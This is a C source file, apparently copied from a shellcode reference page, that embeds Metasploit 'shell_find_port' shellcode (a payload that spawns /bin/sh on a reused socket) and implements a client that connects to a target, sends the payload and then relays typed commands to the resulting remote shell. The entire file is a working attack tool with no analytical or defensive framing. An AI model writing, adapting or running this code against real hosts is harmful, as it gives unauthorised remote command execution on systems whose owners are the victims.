/*
    http://www.blackhatlibrary.net/Shellcode/Appendix#socket-reuse-send.c
*/

#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
 
/*
 * # msfpayload linux/x86/shell_find_port CPORT=4444 C
 *
 * linux/x86/shell_find_port - 62 bytes
 * http://www.metasploit.com
 * VERBOSE=false, CPORT=4444, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, InitialAutoRunScript=, AutoRunScript=
 */
char shellcode[] = 
"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff"
"\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x11\x5c\x75\xf1\x5b"
"\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
"\xcd\x80";
 
void error(char *err) {
  perror(err);
  exit(0);
}
 
int main(int argc, char *argv[]) {
  struct sockaddr_in server_addr, bind_addr;
  struct hostent* server, *_bind;
  char buf[1024], inbuf[1024];
  int sock;
 
  _bind = gethostbyname(argv[3]);
  bind_addr.sin_family = AF_INET;
  bind_addr.sin_port   = htons(atoi(argv[4]));
  memcpy(&bind_addr.sin_addr.s_addr, _bind->h_addr, _bind->h_length);
 
  server = gethostbyname(argv[1]);
  server_addr.sin_family = AF_INET;
  memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
  server_addr.sin_port = htons(atoi(argv[2]));
 
  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    error(" [!] socket()");
 
  if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
    error(" [!] bind()");
 
  printf(" [*] Connecting to %s\n", argv[1]);
  if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    error(" [*] connect()");
 
  printf(" [*] Sending payload\n");
  if (send(sock, shellcode, strlen(shellcode), MSG_NOSIGNAL) < 0)
    error(" [!] write()");
 
  while(fgets(buf, 1024, stdin) != NULL) {
    if (send(sock, buf, strlen(buf), MSG_NOSIGNAL) < 0)
      error(" [!] write(): ");
    if (recv(sock, inbuf, 1024, 0) < 0)
      error(" [!] read(): ");
    printf("%s", inbuf);
    memset(inbuf, 0, 1024);
    memset(buf, 0, 1024);
  }
 
  return 0;
}
